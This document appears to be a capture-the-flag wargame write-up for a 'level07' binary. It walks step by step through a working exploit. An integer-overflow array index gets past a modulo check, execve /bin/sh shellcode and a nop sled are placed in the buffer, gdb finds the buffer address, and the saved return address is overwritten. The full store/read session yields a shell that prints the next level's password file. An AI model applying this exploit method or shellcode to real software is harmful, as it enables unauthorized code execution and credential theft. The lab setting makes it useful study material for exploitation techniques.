overwrite eip save using an index integer overflow to bypass %3 check

shellcode -> buffer
\x90\x90\x90\x90 \x90\x90\x90\x90 \x90\x90\x90\x90 \x90\x90\x90\x90 \x6a\x0b\x58\x99 \x52\x68\x2f\x2f \x73\x68\x68\x2f \x62\x69\x6e\x89 \xe3\x31\xc9\xcd \x80 ; 21 bytes execv() shellcode

address of buffer to overwrite eip save					; ebp + 36 in store_num()

find eip save relative to start of buffer 
4 pushed registers (16)
and esp, 0xfffffff0 (alignment to 16 bytes, removed 12 bytes)
size of stack: 0x1d0 (464)
start of buffer: esp+0x24 (36)

(464-36+16+12)/4 = 114

Find the integer that will overflow to 114 after being multiplied by 4 (shl 2)
1073741824 (a quarter of UINT_MAX, *4=0)
1073741824+114
1073741938

We can use read command to check if we are storing at the correct index (it should segfault when we quit)
./level07
Input command: store
 Number: 45
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 45
 Completed read command successfully
Input command: quit
Segmentation fault (core dumped)

Lets find the address of our buffer
gdb level07
b *0x08048795	; its address is loaded into ebx here
r
Breakpoint 1, 0x08048795 in main ()
p (void*)$ebx
$1 = (void *) 0xffffd504

printf %d 0xffffd504
4294956292

All that is left is placing our shellcode inside the buffer:
- divide into 4 bytes sections
- reverse them
- convert to decimal
- store them starting from index 0 (using the overflow exploit)

Because gdb adds runtime environment variables, the address of our buffer is innacurate, adding some '\90' instruction padding and increasing our address by 32 bytes is enough to reach it

printf %d 0xffffd536 ; address of buffer +32
4294956342

./level07
Input command: store
 Number: 4294956292
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 4294956292
 Completed read command successfully
Input command: store
 Number: 2425393296
 Index: 1073741824
 Completed store command successfully
Input command: store
 Number: 2425393296
 Index: 1
 Completed store  command successfully
Input command: store
 Number: 2425393296
 Index: 2
 Completed store command successfully
Input command: store
 Number: 2425393296
 Index: 1073741827
 Completed store command successfully
Input command: store
 Number: 2572684138
 Index: 4
 Completed store command successfully
Input command: 791636050
 Failed to do 791636050 command
Input command: store
 Number: 791636050
 Index: 5
 Completed store command successfully
Input command: store
 Number: 795371635
 Index: 1073741830
 Completed store command successfully
Input command: store
 Number: 2305714530
 Index: 7
 Completed store command successfully
Input command: store
 Number: 3452514787
 Index: 8
 Completed store command successfully
Input command: store
 Number: 128
 Index: 1073741833
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 4294956292
 Completed read  command successfully
Input command: store
 Number: 4294956342
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 4294956342
 Completed read command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
